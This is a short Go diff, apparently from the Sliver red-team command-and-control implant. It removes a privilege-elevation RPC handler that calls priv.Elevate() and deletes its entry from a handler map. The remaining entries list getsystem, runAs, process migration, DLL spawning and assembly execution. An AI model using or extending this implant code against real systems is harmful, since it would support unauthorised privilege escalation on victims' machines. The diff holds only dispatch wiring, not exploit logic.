@@ -42,7 +42,6 @@ var (
 		sliverpb.MsgRevToSelf:          revToSelfHandler,
 		sliverpb.MsgRunAsReq:           runAsHandler,
 		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
-		sliverpb.MsgElevateReq:         elevateHandler,
 		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
 		sliverpb.MsgSpawnDllReq:        spawnDllHandler,
@@ -147,26 +146,6 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 		getSys.Response = &commonpb.Response{Err: err.Error()}
 	}
 	data, err = proto.Marshal(getSys)
-	resp(data, err)
-}
-
-func elevateHandler(data []byte, resp RPCResponse) {
-	elevateReq := &sliverpb.ElevateReq{}
-	err := proto.Unmarshal(data, elevateReq)
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	err = priv.Elevate()
-	elevate := &sliverpb.Elevate{
-		Success: err == nil,
-	}
-	if err != nil {
-		elevate.Response = &commonpb.Response{Err: err.Error()}
-	}
-	data, err = proto.Marshal(elevate)
 	resp(data, err)
 }
 
